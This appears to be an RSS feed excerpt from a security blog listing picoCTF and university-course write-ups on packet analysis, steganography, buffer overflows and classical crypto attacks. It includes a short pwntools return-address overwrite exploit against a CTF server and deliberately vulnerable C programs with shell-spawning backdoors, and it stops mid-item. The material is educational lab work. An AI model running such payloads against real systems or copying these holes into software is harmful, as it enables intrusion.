Exploit - TLS Decrypt 在Edit/Preferences/RSA Keys/中Add new keyfile 加入題目給的private key file後記得要重新開啟該pcap file</description></item><item><title>PicoCTF - WhitePages</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---whitepages/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---whitepages/index.html</guid><description>PicoCTF - WhitePages tags: PicoCTF CTF Misc Challenge: WhitePages
Source code :::spoiler source text
:::
Exploit - Binary Encoding If you use sublime editor to observe the file, then you may see the result as below. In unicode, &lt;0x2003> is a kind of white space, then some gap between &lt;0x2003> is a normal white space. Obviously, this is a binary encoding(&lt;0x2003> is 0 and normal white space is 1)</description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</guid><description>PicoCTF - Who are you? tags: PicoCTF CTF Web Background 【Chrome 85 更新】淺談 Referer-Policy 和更新影響 HTTP Referer 是什麼? 當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。
舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 https://ithelp.ithome.com.tw/ 的網址。
RFC 2616 - Date The Date general-header field represents the date and time at which the message was originated, having the same semantics as orig-date in RFC 822. The field value is an HTTP-date, as described in section 3.3.1; it MUST be sent in RFC 1123 [8]-date format.</description></item><item><title>PicoCTF - Wireshark twoo twooo two twoo...</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html</guid><description>PicoCTF - Wireshark twoo twooo two twoo… tags: PicoCTF CTF Misc Challenge: Wireshark twoo twooo two twoo…
Exploit - DNS + sub-domain Statistic Using statistic to analyze http requests and you’ll see that there is /flag and / in address 18.217.1.57. Maybe it’s a clue or key to find flag String search technique
$ strings shark2.pcapng | grep "pico" picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b} picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245} picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b} picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810} picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e} picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7} picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133} ... You’ll find tons of fake flag. Obviously, it’s a trap to distract you.</description></item><item><title>PicoCTF - Wizardlike</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</guid><description>PicoCTF - Wizardlike Recon 這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象
遊戲本身根本無法破關 有一些"道路"回隨著角色本身的移動慢慢浮現出來 我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原
Exploit - 通靈 f = open('./cipher.txt', 'r').read() pt = open('./flag.txt', 'w') flag = "\n".join([f[100 * i : 100 * i + 100] for i in range(len(f) // 100)]) pt.write(flag) :::spoiler flag
######### #.......# ......#................................... #.......# ....................####.#####.#####..###. #........ .####.#..###..###..#.......#...#......#... #.......# .# #.#.#....# #.#.......#...###...#.... #.......# .####.#.#....# #.#.......#...#......#... #.......# .#....#..###..###...####...#...#......###. #.......# .#........................................ #.......# .......................................... #.......# #.......# #.......# #.......# #.......# #......># ######### #####. ............................................................. #.&lt;.#. ...............#..#.............##.......#..#........#....... #...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#....... #...#. .#..#.#........####.......#.#.#..#...#...####.#...####....... #...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####. . ............................................................. . ............................................................. . ............................................................. #.... #...# #...# #...# #...# #...# #.>.# ##### ################# ....... #&lt;..............#. ..###.. #...............#.. .#...#. #..............#......###.. #...#.......#...#.. .#...#. #..###.....###..#. ..###.. #...#...#...#...# ....... #......#>#......# ....... #...............# #...#.......#...# #..###.....###..# #...#.......#...# #...............# #...............# #...............# ################# ... .. ....... .&lt;. ####. .#####. ... ...#.. .#..... ... ...#....###... ..>#.. .#..... ####. .#..... .. ....... ....... ######################## #&lt;.............#.......# #..............#.#...#.# #..............#.#...#.# #..............#.#####.# #..............#.....#.# #..............#.....#.# #..............#.......# #..............#.......# ######################## ....... .&lt;..... ....... ....... ....... ....... ....... ....... ....... ....... ....... .....>. ....... ####### ....... .####.. .#...#. .####.. .#...#. .####.. ....... ....... ... .&lt;......... ........... ... .. .. .. .. .. .. .. .............. ..##########.. .# #. .# ....... #. .# ..###.. #. .# .#...#. #. .# .#...#. #. .# .#...#. #. .# ..###.. #. .# ....... #. .# ....... #. .# #. ..##########.. .............> ######################### #&lt;#......#.#.......###..# #.#.###..#.#.......##..## #.#.#.#..#.#.......#..### #.#.#.#..#.#.......#...## #...#....#..#......#....# #.######.##..###.###....# #.#.....................# #.###.#################.# #.......................# #########.###.#########.# #.......#.#.#.#.........# #.#...#.#.#...#.######### #.#...#.#.#.#.#.........# #.#####.#.#.#.#########.# #.....#.#.#.#.#.........# #.....#.#.#.#.#.######### #.......#.#.#.#.........# #.......#.#.#.#########.# #########.#.#.#...#...#.# #...........#.#.#.#.#.#.# #########...#.#.#.#.#.#.# #.......#...#.#.#.#.#.#.# ####.####...#.#.#.#.#.#.# ##..........#.#.#.#.#.#.# #.#..####...#.#.#.#.#.#.# #..#....#####.#.#.#.#.#.# #...#...#...#.#.#...#...# #....#........#.######### #...........#.#........># ########################. ... ....... .&lt;. ..###.. ... .#...#. ... .#####. .#...#. .#...#. ....... ....... #####################################################################################..............# #####################################################################################.#####.###....# #####################################################################################.#.......#....# #####################################################################################.###......#...# #####################################################################################.#.......#....# #####################################################################################.#####.###....# #####################################################################################..............# #####################################################################################..............# :::</description></item><item><title>PicoCTF - WPA-ing Out</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html</guid><description>PicoCTF - WPA-ing Out tags: PicoCTF CTF Misc Challenge: WPA-ing Out
Background Day 26 Wireless Attacks-無線攻擊(aircrack-ng)
Description &amp; Hint I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the rockyou.txt credential dump. Use this pcap file and the rockyou wordlist. The flag should be entered in the picoCTF{XXXXXX} format.</description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</guid><description>PicoCTF - x-sixty-what Source code :::spoiler
:::
Recon 這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP1，發現應該return到0x40123b，不太知道為甚麼
第一張是return 2 0x401236 第二張是return 2 0x40123b Exploit 用動態的方式看offset $$ 0x7fffffffd758 - 0x00007fffffffd710 = 0x48 $$ from pwn import * r = remote('saturn.picoctf.net', 58166) # r = process('./vuln') context.arch = 'amd64' raw_input() print(r.recvline().strip().decode()) payload = b'a'*0x48 + p64(0x40123b) print(payload) r.sendline(payload) r.interactive() Flag: picoCTF{b1663r_15_b3773r_e79d5a75}</description></item><item><title>PicoCTF - XtraORdinary</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html</guid><description>PicoCTF - XtraORdinary Background How to Convert Hex String to Bytes in Python? Python 好用模組介紹 - itertools &amp; more-itertools Python File readline() Method Python append to a file
Source code :::spoiler Source Code
#!/usr/bin/env python3 from random import randint with open('flag.txt', 'rb') as f: flag = f.read() with open('secret-key.txt', 'rb') as f: key = f.read() def encrypt(ptxt, key): ctxt = b'' for i in range(len(ptxt)): a = ptxt[i] b = key[i % len(key)] ctxt += bytes([a ^ b]) return ctxt ctxt = encrypt(flag, key) random_strs = [ b'my encryption method', b'is absolutely impenetrable', b'and you will never', b'ever', b'ever', b'ever', b'ever', b'ever', b'ever', b'break it' ] for random_str in random_strs: for i in range(randint(0, pow(2, 8))): for j in range(randint(0, pow(2, 6))): for k in range(randint(0, pow(2, 4))): for l in range(randint(0, pow(2, 2))): for m in range(randint(0, pow(2, 0))): ctxt = encrypt(ctxt, random_str) with open('output.txt', 'w') as f: f.write(ctxt.hex()) :::</description></item><item><title>PicoCTF 2023</title><link>https://bernie6401.github.io/security/competition/picoctf-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/picoctf-2023/index.html</guid><description>PicoCTF 2023 :::spoiler [TOC] :::
Crypto HideToSee Recon 這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了write up才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide
Exploit - Steghide + Atbash 先用steghide解密出隱藏的文檔 $ steghide extract -sf atbash.jpg 用online tool解密 Reverse Reverse IDA Flag: picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}
Safe Opener 2 Strings search Flag: picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}
timer Use mobsf Flag: picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}
Ready Gladiator 0 ??? picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377} Forensics hideme Use binwalk to observe that it should be a zip file.
$ binwalk flag.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed 39739 0x9B3B Zip archive data, at least v1.0 to extract, name: secret/ 39804 0x9B7C Zip archive data, at least v2.0 to extract, compressed size: 3037, uncompressed size: 3187, name: secret/flag.png 43076 0xA844 End of Zip archive, footer length: 22 Change extension to zip file and extract it</description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/index.html</guid><description>Simple Buffer Overflow - 0x00 tags: CTF PWN Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> int main() { char buf[0x10]; read(0, buf, 0x30); // It'll read the value that you input and store in buf with length=0x30 system("pause"); return 0; } Note that you can check this page to know more about read function Dynamic Analysis - x32dbg This is the original entry point of this program.</description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/index.html</guid><description>Simple Buffer Overflow - 0x01 tags: CTF PWN Follow the concept of lecture 0x00
Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> void y0u_c4n7_533_m3() { execve("/bin/sh", (char *[]){0}, (char *[]){0}); } int main() { char buf[16]; puts("This is your first bof challenge ;)"); fflush(stdout); read(0, buf, 0x30); system("pause"); return 0; } The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow. We can check bof in the main function that it read the string with length 0x30 that bigger than buf size.</description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/index.html</guid><description>Simple Buffer Overflow - 0x02 tags: CTF PWN Why we’d like to create shellcode? In pwn problem, most of the program don’t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use bof to overlap the original address by shellcode address. Then we can take the shell.
How to create a shellcode in BOF? In lecture 0x01, we can see sub-function that create a shell using command:</description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/index.html</guid><description>Simple Buffer Overflow - 0x04 tags: CTF PWN Original Code #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> char message[48]; int main() { char name[16]; printf("Give me your message: "); fflush(stdout); read(0, message, 0x30); fflush(stdout); read(0, name, 0x30); return 0; } Actually, this is a variant of the lecture 0x01
Note that, the global variable has its own address, instead of local variable that push to stack that we don’t know at first.</description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/index.html</guid><description>Simple Buffer Overflow - 0x05(Leak Canary) tags: CTF PWN eductf Canary Background Original Code #include &lt;stdio.h> #include &lt;unistd.h> #include &lt;stdlib.h> void backdoor() { system("/bin/sh"); } int main() { setvbuf(stdin, 0, _IONBF, 0); setvbuf(stdout, 0, _IONBF, 0); char name[0x10]; char phone[0x10]; printf("What's your name: "); read(0, name, 0x100); printf("Hello, %s !", name); printf("What's your phone number: "); read(0, phone, 0x100); return 0; } Note that, if you establish the code yourself, you must turn off the protection by the command below and use checksec to observe the protection gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro Exploit First, we can use objdump -d -M Intel {filename} to check the address of backdoor → 0x4011b6</description></item><item><title>Simple Crypto - 0x01(Modular Operation)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/index.html</guid><description>Simple Crypto - 0x01(Modular Operation) tags: CTF Crypto eductf Background 『Day 23密碼卷宗現代篇非對稱章 - RSA 模运算与逆元 模運算基本特性: $$ (a + b) % p = (a % p + b % p) % p \ (a - b) % p = (a % p - b % p) % p \ (a * b) % p = (a % p * b % p) % p \ (a ^ b) % p = ((a % p) ^ b ) % p $$ 模運算的结合律： $$ ((a + b) % p + c) % p= (a + (b + c) % p) % p \ ((a * b) % p * c) % p = (a * (b * c) % p ) % p $$ 交換律： $$ (a + b) % p = (b+a) % p \ (a * b) % p = (b * a) % p $$ 分配率： $$ ((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p $$</description></item><item><title>Simple Crypto - 0x02(Random Number Generator - LCG)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/index.html</guid><description>Simple Crypto - 0x02(Random Number Generator - LCG) tags: CTF Crypto eductf Background Linear Congruential Generator: Analysis LCG Formula $$ \begin{aligned} Unknown: S_0&amp;=Seed,\ A,\ B,\ m = 2^{32} \ Given: S_1&amp;,\ S_2,\ S_3\ S_1 &amp;\equiv (AS_0\ +\ B)\ %\ m\ S_2 &amp;\equiv (AS_1\ +\ B)\ %\ m\ S_3 &amp;\equiv (AS_2\ +\ B)\ %\ m\ \end{aligned} $$
Derived A $$ \begin{aligned} &amp;\left{ \begin{array}{c} S_2 &amp;\equiv (AS_1\ +\ B)\ %\ m\ S_3 &amp;\equiv (AS_2\ +\ B)\ %\ m \end{array} \right. \ \ \ \ \ \ minus \ two \ formula\ \ &amp;\to (S_2-S_3) \equiv (AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m \ &amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m]\ %\ m \ &amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)-(AS_2\ +\ B)]\ %\ m \ &amp;\to (S_2-S_3)\ % \ m\equiv \ A\ (S_1-S_2)\ \ %\ m =(S_2-S_3)\ A&amp;=((S_2-S_3)(S_1-S_2)^{-1})\ %\ m \end{aligned} $$</description></item><item><title>Simple Crypto - 0x03(2023 Lab - COR)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/index.html</guid><description>Simple Crypto - 0x03(2023 Lab - COR) Background Simple Crypto - 0x03(Lab - LFSR)
Source Code :::spoiler
import random from secret import FLAG class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): f = sum([self._state[i] for i in self._tap]) &amp; 1 x = self._state[0] self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 lfsr1 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(19)]) lfsr2 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(23)]) lfsr3 = LFSR([0, 1, 2, 5], [random.randrange(2) for _ in range(27)]) cipher = triLFSR(lfsr1, lfsr2, lfsr3) flag = map(int, ''.join(["{:08b}".format(c) for c in FLAG])) output = [] for _ in range(200): output.append(cipher.getbit()) for b in flag: output.append(cipher.getbit() ^ b) print(output) # [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0] :::</description></item><item><title>Simple Crypto - 0x03(Lab - LFSR)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/index.html</guid><description>Simple Crypto - 0x03(Lab - LFSR) tags: eductf CTF Crypto Background [2022 fall] 0923 Crypto - LFSR Crypto I - LFSR
Source Code Must read the source code first with some comment I added :::spoiler source code
import random # from secret import FLAG FLAG = b'00001111' class LFSR: def __init__(self, tap, state): self._tap = tap self._state = state def getbit(self): # f is the new bit that append in last position f = sum([self._state[i] for i in self._tap]) &amp; 1 # x is the output bit x = self._state[0] # self._state is a new state self._state = self._state[1:] + [f] return x class triLFSR: def __init__(self, lfsr1, lfsr2, lfsr3): self.lfsr1 = lfsr1 self.lfsr2 = lfsr2 self.lfsr3 = lfsr3 def getbit(self): x1 = self.lfsr1.getbit() x2 = self.lfsr2.getbit() x3 = self.lfsr3.getbit() return x2 if x1 else x3 # These are the state of lfsr1, lfsr2, and lfsr3 A = [random.randrange(2) for _ in range(27)] B = [random.randrange(2) for _ in range(23)] C = [random.randrange(2) for _ in range(25)] print(A, B, C) # tap is a filter that decide the last bit is 1 or 0 tap1 = [0, 13, 16, 26] tap2 = [0, 5, 7, 22] tap3 = [0, 17, 19, 24] lfsr1 = LFSR(tap1, A) lfsr2 = LFSR(tap2, B) lfsr3 = LFSR(tap3, C) cipher = triLFSR(lfsr1, lfsr2, lfsr3) # Transfer the flag to ascii code and expressed in binary # e.g. FLAG = '00001111' → '3030303031313131' → '001100000011000000110000...00110001'(64 bits) flag = map(int, ''.join(["{:08b}".format(c) for c in FLAG])) output = [] for b in flag: # print(b) output.append(cipher.getbit() ^ b) for _ in range(200): output.append(cipher.getbit()) # print(output) :::</description></item><item><title>Simple Crypto - 0x04(2023 Lab - POA)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/index.html</guid><description>Simple Crypto - 0x04(2023 Lab - POA) Background Crypto I - Timmy
Source Code :::spoiler Source Code
#! /usr/bin/python3 from Crypto.Cipher import AES import os from secret import FLAG def pad(data, block_size): data += bytes([0x80] + [0x00] * (15 - len(data) % block_size)) return data # padding style: &lt;oooooo[0x80][0x00]...[0x00]> (find first [0x80]) def unpad(data, block_size): if len(data) % block_size: raise ValueError padding_len = 0 for i in range(1, len(data) + 1): if data[-i] == 0x80: padding_len = i break elif data[-i] != 0x00: raise ValueError else: raise ValueError return data[:-padding_len] key = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC) ct = cipher.encrypt(pad(FLAG, AES.block_size)) iv = cipher.iv print((iv + ct).hex()) # same encryption while True: try: inp = bytes.fromhex(input().strip()) # hex style input iv, ct = inp[:16], inp[16:] # get first 16 bytes from input cipher = AES.new(key, AES.MODE_CBC, iv) pt = unpad(cipher.decrypt(ct), AES.block_size) print("Well received :)") except ValueError: print("Something went wrong :(") :::</description></item><item><title>Simple Crypto - 0x05(2023 Lab - LSB)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/index.html</guid><description>Simple Crypto - 0x05(2023 Lab - LSB) Background [edu-ctf 2023] week01 - crypto1 Source code :::spoiler Source Code
#! /usr/bin/python3 from Crypto.Util.number import bytes_to_long, getPrime import os from secret import FLAG p = getPrime(1024) q = getPrime(1024) n = p * q phi = (p - 1) * (q - 1) e = 65537 d = pow(e, -1, phi) m = bytes_to_long(FLAG + os.urandom(256 - len(FLAG))) assert m &lt; n enc = pow(m, e, n) print(n) print(e) print(enc) while True: inp = int(input().strip()) pt = pow(inp, d, n) print(pt % 3) :::</description></item><item><title>Simple Crypto - 0x06(2023 HW - LFSR)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/index.html</guid><description>Simple Crypto - 0x06(2023 HW - LFSR) Background Python – List XOR from funtools import reduce test_list = [4, 6, 2, 3, 8, 9] res = reduce(lambda x, y: x ^ y, test_list) # The output is 2 Numpy矩陣乘法，但不是乘法，而是XOR的元素 import numpy as np m1 = np.array([[1, 0, 0], [0, 0, 0], [0, 0, 0]]) m2 = np.array([[1, 0, 1], [0, 0, 1], [1, 1, 1]]) mr = np.empty((m2.shape[0], m1.shape[1]), dtype = np.int64) for i in range(mr.shape[0]): for j in range(mr.shape[1]): mr[i, j] = np.sum(m1[:, j] ^ m2[i, :]) print(mr) 使用 Python 來認識矩陣 [Day07]Learning Numpy - 建立、合併、分割 - CheetSheet for Numpy Sage $ sudo apt install sagemath -y # wsl/unix base可以直接安裝，如果是windows要下載sage binary，有1.4GB $ sage -n # 開起sage notebook，也就是可以用sage kernel運行jupyter $ sage &lt;.py/.sage file> # 用sage運行腳本 $ sage # 直接開啟sage interactive shell Recon 這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{710+70},\ S_{711+70},\ S_{712+70},\ S_{713+70}…$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State</description></item><item><title>Simple Crypto - 0x07(2023 HW - Oracle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/index.html</guid><description>Simple Crypto - 0x07(2023 HW - Oracle) Background POA/RSA
Source code :::spoiler Oracle.py
from Crypto.Util.number import bytes_to_long from Crypto.Cipher import AES from random import randbytes from secret import aes_key, p, q def pad(m): length = 16-len(m) % 16 return m + chr(length).encode()*length def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise ValueError return c[:-length] def asymmetric_encryption(message, N, e): # encrypt message with RSA # message must be 16 bytes # padding 100 bytes random value padded_message = randbytes(100) + message return pow(bytes_to_long(padded_message), e, N) def symmetric_encryption(message, key): # ecrypt message with AES + CBC Mode # message can be arbitrary length cipher = AES.new(key, AES.MODE_CBC) ct = cipher.encrypt(pad(message)) iv = cipher.iv return iv, ct ## Alice: This is my public key. # p = getPrime(512) # q = getPrime(512) N = p * q e = 65537 print( f"{N = }, {e = }" ) # N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223 # e = 65537 ## Bob: I want to send message to Alice! But my message is too looooooong...... flag = open("flag.png", "rb").read() ## Bob: Oh! I can use symmetric encryption. iv, ct = symmetric_encryption(flag, aes_key) encrypted_key = asymmetric_encryption(aes_key, N, e) encrypted_iv = asymmetric_encryption(iv, N, e) print( f"{encrypted_key = }" ) print( f"{encrypted_iv = }" ) open("encrypted_flag.not_png", "wb").write(ct) ## Bob: Ha ha! Now no one can decrypt my message except Alice! # encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692 # encrypted_iv = 